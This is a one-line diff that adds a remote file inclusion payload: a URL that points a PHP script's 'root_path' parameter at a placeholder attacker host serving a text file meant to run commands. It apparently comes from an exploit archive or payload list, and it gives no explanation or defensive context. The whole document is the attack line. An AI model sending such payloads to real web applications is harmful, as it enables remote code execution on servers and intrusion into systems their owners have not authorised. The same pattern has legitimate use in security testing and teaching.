@@ -1,0 +1,1 @@
+http://www.example.com/index.php?root_path=http://yourevil.com/r0x.txt?cmd
